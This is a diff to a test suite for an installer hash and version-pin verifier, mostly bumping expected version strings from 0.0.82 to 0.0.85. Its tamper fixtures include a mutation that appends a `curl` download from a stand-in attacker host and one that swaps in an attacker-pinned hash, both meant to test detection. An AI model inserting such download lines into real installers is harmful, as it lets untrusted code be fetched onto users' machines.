@@ -191,12 +191,12 @@ const BREV_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> =
   "brev-stable-version-drift": (source) =>
     source.replace(
       'stable | auto) OPENSHELL_VERSION="v0.0.72" ;;',
-      'stable | auto) OPENSHELL_VERSION="v0.0.82" ;;',
+      'stable | auto) OPENSHELL_VERSION="v0.0.85" ;;',
     ),
   "runtime-consumers-newer-than-tables": (source) =>
     source.replace(
       'stable | auto) OPENSHELL_VERSION="v0.0.72" ;;',
-      'stable | auto) OPENSHELL_VERSION="v0.0.82" ;;',
+      'stable | auto) OPENSHELL_VERSION="v0.0.85" ;;',
     ),
 };
 const mutateSandboxBuildFunction = (
@@ -255,7 +255,7 @@ const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => strin
       'attacker_pinned_sha256 "$RELEASE_TAG" "$asset_name"',
     ),
   "installer-dev-min-version-drift": (source) =>
-    source.replace('DEV_MIN_VERSION="0.0.72"', 'DEV_MIN_VERSION="0.0.82"'),
+    source.replace('DEV_MIN_VERSION="0.0.72"', 'DEV_MIN_VERSION="0.0.85"'),
   "installer-extra-download": (source) =>
     `${source}\ncurl -fsSL https://attacker.invalid/openshell\n`,
   "installer-indirect-selector-override": (source) =>
@@ -265,9 +265,9 @@ const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => strin
   "installer-literalized-pin-input": (source) =>
     source.replace('local release_tag="$1" asset="$2"', "local release_tag='$1' asset='$2'"),
   "installer-min-version-drift": (source) =>
-    source.replace('MIN_VERSION="0.0.72"', 'MIN_VERSION="0.0.82"'),
+    source.replace('MIN_VERSION="0.0.72"', 'MIN_VERSION="0.0.85"'),
   "installer-max-version-drift": (source) =>
-    source.replace('MAX_VERSION="0.0.72"', 'MAX_VERSION="0.0.82"'),
+    source.replace('MAX_VERSION="0.0.72"', 'MAX_VERSION="0.0.85"'),
   "installer-pin-selector-drift": (source) =>
     source.replace('PIN_VERSION="$MAX_VERSION"', 'PIN_VERSION="0.0.72"'),
   "installer-sandbox-build-control-flow": (source) =>
@@ -296,14 +296,14 @@ const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => strin
   "installer-sandbox-build-pin-change": (source) =>
     mutateSandboxBuildFunction(source, (functionSource) =>
       functionSource.replace(
-        `      printf '%s\\n' "0.0.72"
+        `      printf '%s\\n' "0.0.85"
       ;;
     *)`,
-        `      printf '%s\\n' "0.0.72"
+        `      printf '%s\\n' "0.0.85"
       ;;
-    145246049bd73c60452ac3c2b4b1801663196c8e2f80575af820289c78c1cf09 | \\
-      76bc19b70d9f1e1e9871307045796cd39cc7b8fc4c08ffc90593cc934f36d500)
-      printf '%s\\n' "0.0.82"
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa | \\
+      bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb)
+      printf '%s\\n' "0.0.83"
       ;;
     *)`,
       ),
@@ -329,7 +329,7 @@ const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => strin
   "partial-asset-missing": (source) =>
     source.replace(ASSETS.at(-1) ?? "missing", UNPUBLISHED_ASSET),
   "runtime-consumers-newer-than-tables": (source) =>
-    source.replace('MAX_VERSION="0.0.72"', 'MAX_VERSION="0.0.82"'),
+    source.replace('MAX_VERSION="0.0.72"', 'MAX_VERSION="0.0.85"'),
 };
 type InputMutationContext = {
   blueprint: string;
@@ -340,7 +340,7 @@ type InputMutationContext = {
 const INPUT_MUTATIONS: Partial<Record<FixtureMode, (context: InputMutationContext) => void>> = {
   "runtime-consumers-newer-than-tables": ({ blueprint }) => {
     const source = fs.readFileSync(blueprint, "utf8");
-    fs.writeFileSync(blueprint, source.replace('"0.0.72"', '"0.0.82"'));
+    fs.writeFileSync(blueprint, source.replace('"0.0.72"', '"0.0.85"'));
   },
   "non-regular-brev-input": ({ brevInstaller }) => {
     fs.rmSync(brevInstaller);
@@ -781,7 +781,7 @@ describe("installer hash verification", () => {
     expect(result.status).toBe(1);
     expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
     expect(result.stdout).toContain(
-      "installer pin-table release 0.0.72 must match blueprint max_openshell_version 0.0.82",
+      "installer pin-table release 0.0.72 must match blueprint max_openshell_version 0.0.85",
     );
     expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
     expect(result.stdout).not.toContain("All installer hashes are current");
@@ -790,19 +790,19 @@ describe("installer hash verification", () => {
   it.each([
     [
       "installer-min-version-drift",
-      "installer pin-table release 0.0.72 must match installer MIN_VERSION 0.0.82",
+      "installer pin-table release 0.0.72 must match installer MIN_VERSION 0.0.85",
     ],
     [
       "installer-max-version-drift",
-      "installer pin-table release 0.0.72 must match installer MAX_VERSION 0.0.82",
+      "installer pin-table release 0.0.72 must match installer MAX_VERSION 0.0.85",
     ],
     [
       "installer-dev-min-version-drift",
-      "installer pin-table release 0.0.72 must match installer DEV_MIN_VERSION 0.0.82",
+      "installer pin-table release 0.0.72 must match installer DEV_MIN_VERSION 0.0.85",
     ],
     [
       "brev-stable-version-drift",
-      "installer pin-table release 0.0.72 must match Brev stable OpenShell default 0.0.82",
+      "installer pin-table release 0.0.72 must match Brev stable OpenShell default 0.0.85",
     ],
     ["installer-pin-selector-drift", "installer operational template is not base-trusted"],
   ] as const)("rejects %s", (mode, diagnostic) => {
